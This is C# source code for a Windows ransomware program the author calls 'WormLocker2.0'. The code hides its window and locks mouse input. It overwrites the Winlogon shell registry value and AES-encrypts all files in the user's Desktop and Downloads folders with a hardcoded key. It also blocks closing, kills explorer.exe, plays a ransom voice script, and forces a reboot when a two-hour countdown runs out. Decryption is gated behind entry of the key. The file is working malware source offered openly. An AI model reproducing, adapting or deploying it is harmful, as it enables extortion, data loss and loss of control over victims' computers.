using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
/*
Surely you know that my ransomware will not appear until after encryption.
Why? If the window was displayed before encryption, the ransomware could crash. 
That's why the mouse locks. 
*/

namespace WormLocker2._0
{
    public partial class WormLocker2 : Form
    {
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block); //Mouse lock function

        public WormLocker2()
        {
            InitializeComponent();
            label1.Text = TimeSpan.FromMinutes(120).ToString(); //Make a countdown
        }

        private void WormLocker2_Load(object sender, EventArgs e)
        {
            //Path to desktop, downloadfolder
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            this.Location = new Point(-1000, -1000); //Move the window to the opposite side of the screen
            //Edit winlogon
            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "empty", RegistryValueKind.String);
            /*            
            We need to create a file before encrypting. Why?
            If the folder was empty and the ransomware started the encryption,
            the ransomware would crash.
            */
            File.WriteAllText(path + @"\worm_tool.sys", "encrypted"); //Create file in desktop
            File.WriteAllText(downloadFolder + @"\worm_tool.sys", "encrypted"); //Create file in downloadfolder

            /*         
            Repeat to delete desktop.ini. 
            Why? Because desktop.ini updates automatically and 
            we can't encrypt hidden files because the ransomware would crash. 
            */
            tmr_del_desktop.Start(); 
            tmr_start_enc.Start(); //Timer to turn on encryption
            tmr_out.Start(); //If time runs out, restart your computer and kill the ransomware

            //Important functions and conditions for the countdown
            var startTime = DateTime.Now;

            var timer = new Timer() { Interval = 1000 };

            timer.Tick += (obj, args) =>
                label1.Text =
                    (TimeSpan.FromMinutes(120) - (DateTime.Now - startTime))
                    .ToString("hh\\:mm\\:ss");

            timer.Enabled = true;

            tmr_unhide.Start(); //After encryption, display the ransomware window
        }

        private void WormLocker2_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //Anti kill
        }

        public class CoreEncryption
        {
            //Important.DO NOT CHANGE!!!
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }

        public class CoreDecryption
        {
            //Important.DO NOT CHANGE!!!
            public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
            {
                byte[] decryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                // The salt bytes must be at least 8 bytes.
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                }

                return decryptedBytes;
            }
        }

        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {
                //Important.DO NOT CHANGE!!!

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = file;

                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }
        public class DecryptionFile
        {
            public void DecryptFile(string fileEncrypted, string password)
            {
                //Important.DO NOT CHANGE!!!

                byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesDecrypted = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, passwordBytes);

                string file = fileEncrypted;
                File.WriteAllBytes(file, bytesDecrypted);
            }
        }

        static void Start_Encrypt()
        {
            /*            
            Here you can change the encryption 
            folders and set your password 
            */
            FreezeMouse(); 
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");

            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files3 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);



            EncryptionFile enc = new EncryptionFile();

            string password = "LUC QPV BTR";

            for (int i = 0; i < files.Length; i++)
            {
                enc.EncryptFile(files[i], password);
            }

            for (int i = 0; i < files3.Length; i++)
            {
                enc.EncryptFile(files3[i], password);

            }




        }

        private void tmr_del_desktop_Tick(object sender, EventArgs e)
        {
            //Delete desktop.ini. DO NOT CHANGE!!!
            tmr_del_desktop.Stop();


            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string filepath = (path + @"\desktop.ini");
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string filedl = (downloadFolder + @"\desktop.ini");

            

            if (File.Exists(filepath))
            {
                File.Delete(filepath);
            }

            if (File.Exists(filedl))
            {
                File.Delete(filedl);
            }

            tmr_del_desktop.Start();
        }

        private void tmr_start_enc_Tick(object sender, EventArgs e)
        {
            tmr_start_enc.Stop();
            Start_Encrypt();


        }

        private void tmr_unhide_Tick(object sender, EventArgs e)
        {
            tmr_unhide.Stop();
            //Kill explorer
            Process[] _process = null;
            _process = Process.GetProcessesByName("explorer");
            foreach (Process proces in _process)
            {
                proces.Kill();
            }
            Process.Start(@"C:\Windows\System32\ransom_voice.vbs"); //Turn on voice for ransomware
            
            CenterToScreen(); //Display the ransomware window in the middle of the screen
            Thawouse(); 
        }

        public static void FreezeMouse() //Freeze mouse
        {
            BlockInput(true);
        }

        public static void Thawouse() //unfreeze
        {
            BlockInput(false);
        }

        private void DECRYPT_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "") //If you dont write
            {
                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            else if (textBox1.Text == "LUC QPV BTR") //If you write correct key
            {
                /*                
                If the user enters the correct key, 
                everything returns to normal 
                */

                MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                //Enable taskmanager
                RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
                File.Delete(@"C:\Windows\System32\LogonUI.exe");
                File.Copy("C:\\Windows\\System32\\LogonUItrue.exe", "C:\\Windows\\System32\\LogonUI.exe");
                File.Delete(@"C:\Windows\System32\LogonUItrue.exe");
                File.Delete(@"C:\Windows\System32\LogonUIinf.exe");

                OFF_Encrypt(); //decrypt all encrypt files
                //Repair shell
                RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
                Process.Start(@"C:\Windows\explorer.exe");

                //kill ransomware
                Process[] _process = null;
                _process = Process.GetProcessesByName("WormLocker2.0");
                foreach (Process proces in _process)
                {
                    proces.Kill();
                }
            }

            else //If you write something for example "bla bla"
            {
                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        static void OFF_Encrypt()
        {
            //This is a decryption function.

            FreezeMouse();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");

            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
            string[] files3 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);



            DecryptionFile dec = new DecryptionFile();

            string password = "LUC QPV BTR";

            for (int i = 0; i < files.Length; i++)
            {
                dec.DecryptFile(files[i], password);
            }

            for (int i = 0; i < files3.Length; i++)
            {
                dec.DecryptFile(files3[i], password);
                Thawouse();

            }

        }

        private void tmr_out_Tick(object sender, EventArgs e)
        {
            tmr_out.Stop();
            Process.Start("shutdown", "/r /t 0");

            Process[] _process2 = null;
            _process2 = Process.GetProcessesByName("wscript");
            foreach (Process proces2 in _process2)
            {
                proces2.Kill();
            }

            Process[] _process = null;
            _process = Process.GetProcessesByName("WormLocker2.0");
            foreach (Process proces in _process)
            {
                proces.Kill();
            }

        }
    }
}
